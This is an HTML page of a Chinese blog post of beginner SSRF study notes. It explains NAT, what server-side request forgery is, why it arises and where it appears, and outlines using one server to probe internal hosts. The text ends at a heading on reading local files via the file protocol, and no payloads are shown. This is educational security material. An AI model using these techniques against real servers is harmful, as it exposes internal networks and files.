

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/tubiao.png">
  <link rel="icon" href="/img/tubiao.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#4F4F4F">
  <meta name="author" content="chen">
  <meta name="keywords" content="">
  
    <meta name="description" content="学习网站  **橙子科技：**https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1iQ4y1u7Pt&#x2F;?spm_id_from&#x3D;333.1387.homepage.video_card.click&amp;vd_source&#x3D;525a280615063349bad5e187f6bfeec3 **靶场：**http:&#x2F;&#x2F;121.43.53.23:9091&#x2F;  前置知识NAT什么是NA">
<meta property="og:type" content="article">
<meta property="og:title" content="SSRF学习">
<meta property="og:url" content="https://yschen20.github.io/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/index.html">
<meta property="og:site_name" content="(๑´ڡ&#96;๑)">
<meta property="og:description" content="学习网站  **橙子科技：**https:&#x2F;&#x2F;www.bilibili.com&#x2F;video&#x2F;BV1iQ4y1u7Pt&#x2F;?spm_id_from&#x3D;333.1387.homepage.video_card.click&amp;vd_source&#x3D;525a280615063349bad5e187f6bfeec3 **靶场：**http:&#x2F;&#x2F;121.43.53.23:9091&#x2F;  前置知识NAT什么是NA">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422215816202.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422214441451.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422215024277.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422221329788.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422221309490.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422221423498.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222040263.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222305099.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222452166.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422222825575.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422223008991.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422225838573.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230035341.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230503939.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230527664.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422230933913.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231338387.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231452206.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231616457.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422231900372.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422232121601.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422232905611.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422233710257.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422233849976.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422234006520.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422234630012.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422234952423.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422235918303.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423001106200.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423001227898.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423003443809.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423003424298.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423003533987.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423004628798.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423004637464.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423004946693.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423005131168.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423005305165.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423010222009.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423011020182.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423011541207.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423012316053.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423012342123.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423013351894.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423013736219.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423013853782.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423131511681.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423132338626.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423132638267.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423135138756.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423135214639.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423134019306.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423135501357.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/1737183472115-1fe2ee10-c532-44bb-b5d8-ac7569a5c703.webp">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423141417741.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423142122121.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423142207456.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423143421393.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423143712002.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144503637.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144744986.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144822738.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423144920889.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423145354279.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423145650718.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423150006536.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423150619955.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423150923178.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423151424717.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509202417016.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509205535253.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509205548841.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509213551266.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509213728608.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509210529088.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509214128766.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250509214203895.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423182926236.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423185549061.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423185608042.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423185017524.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423190639575.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191100481.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191158425.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191605610.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423191758724.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423193017235.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423193135040.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423194434594.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423194302965.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423194737386.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423201834987.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423204852849.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423205317234.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423211557880.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423211807854.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423212036497.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224515084.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224444109.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224639293.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423224913559.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225102697.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225255357.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225332934.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225410894.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423225852400.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423230019375.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423230118363.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424001659075.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423233735101.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250423235910306.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000044507.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000201569.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000628991.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424000850842.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424001000102.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424002709598.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424002759890.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424002953081.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004605165.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004643567.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004720696.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424004843016.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424145417317.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424145835373.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424150105087.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424150311486.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424150432270.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424151303007.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424151340968.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424152302727.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424152643088.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424152948552.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424153547262.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424153958769.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154144576.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154225610.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154505121.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424154606727.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424161301409.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424161410956.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424161513308.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424164425169.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424164844401.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424171403427.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424165757734.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170000438.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170153391.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170514771.png">
<meta property="og:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250424170556802.png">
<meta property="article:published_time" content="2025-05-09T13:59:42.000Z">
<meta property="article:modified_time" content="2025-05-09T14:00:28.101Z">
<meta property="article:author" content="chen">
<meta property="article:tag" content="SSRF 学习笔记">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://yschen20.github.io/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422215816202.png">
<meta name="twitter:creator" content="@chen">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>SSRF学习 - (๑´ڡ`๑)</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"yschen20.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-04-25T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>小晨的博客</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/2.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="SSRF学习"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        chen
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-05-09 21:59" pubdate>
          2025年5月9日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          76 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">SSRF学习</h1>
            
              <p id="updated-time" class="note note-info" style="display: none">
                
                  
                    本文最后更新于 2025-05-09T22:00:28+08:00
                  
                  

                
              </p>
            
            
              <div class="markdown-body">
                
                <p><strong>学习网站</strong></p>
<blockquote>
<p>**橙子科技：**<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1iQ4y1u7Pt/?spm_id_from=333.1387.homepage.video_card.click&vd_source=525a280615063349bad5e187f6bfeec3">https://www.bilibili.com/video/BV1iQ4y1u7Pt/?spm_id_from=333.1387.homepage.video_card.click&amp;vd_source=525a280615063349bad5e187f6bfeec3</a></p>
<p>**靶场：**<a target="_blank" rel="noopener" href="http://121.43.53.23:9091/">http://121.43.53.23:9091/</a></p>
</blockquote>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><h3 id="什么是NAT"><a href="#什么是NAT" class="headerlink" title="什么是NAT"></a>什么是NAT</h3><p>NAT（Network Address Translation）：网络地址转换，是一种将私有（保留）地址转化为合法 IP 地址的转换技术，通过将一个外部 IP 地址和端口映射到更大的内部 IP 地址来转换 IP 地址</p>
<p><strong>就是可以将内网 IP 转换成公网 IP，也可以进行端口映射</strong></p>
<h1 id="初识SSRF"><a href="#初识SSRF" class="headerlink" title="初识SSRF"></a>初识SSRF</h1><h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><p>SSRF（Server - Side Request Forgery），也就是服务器端请求伪造。简单来说，这是一种安全漏洞，攻击者可以利用这个漏洞让服务器去访问攻击者指定的其他网络资源。就好像攻击者找到了服务器的一个 “小跟班”，能让这个 “小跟班”（服务器）按照自己的意愿去获取别的地方的信息。</p>
<p><strong>本质上是属于信息泄露漏洞</strong></p>
<p>举例理解：</p>
<p>想象服务器是一个有严格门禁的公司大楼，正常情况下，它只会和经过授权的合作伙伴（正常的网络资源）交流。但是因为有 SSRF 漏洞，攻击者就像一个狡猾的骗子，通过某种手段（漏洞），让大楼里的工作人员（服务器）按照自己的指示，去访问一些未经授权的地方（其他网络资源）。</p>
<h2 id="SSRF的成因"><a href="#SSRF的成因" class="headerlink" title="SSRF的成因"></a>SSRF的成因</h2><p>大部分是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制</p>
<h2 id="可能出现SSRF的地方"><a href="#可能出现SSRF的地方" class="headerlink" title="可能出现SSRF的地方"></a>可能出现SSRF的地方</h2><ul>
<li>从指定URL地址获取网页文本内容</li>
<li>加载指定地址的图片，下载</li>
<li>百度识图，给出一串URL就能识别出图片</li>
</ul>
<h2 id="SSRF攻击方式"><a href="#SSRF攻击方式" class="headerlink" title="SSRF攻击方式"></a>SSRF攻击方式</h2><p>借助主机A来发起SSRF攻击，通过主机A向主机B发起请求，从而获取主机B的一些信息</p>
<p><img src="/2025/04/25/MD5%E7%BB%95%E8%BF%87/image-20250422215816202.png" srcset="/img/loading.gif" lazyload alt="image-20250422215816202"></p>
<h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul>
<li>通过服务器A（SSRF服务器）访问A所在内网的其他服务器。</li>
<li>由SSRF服务器发送http伪协议连接给B服务器</li>
<li>B服务器回复到SSRF服务器</li>
<li>SSRF服务器收到回复后会显示内容</li>
</ul>
<h2 id="利用案例"><a href="#利用案例" class="headerlink" title="利用案例"></a>利用案例</h2><ul>
<li>利用file协议读取本地文件</li>
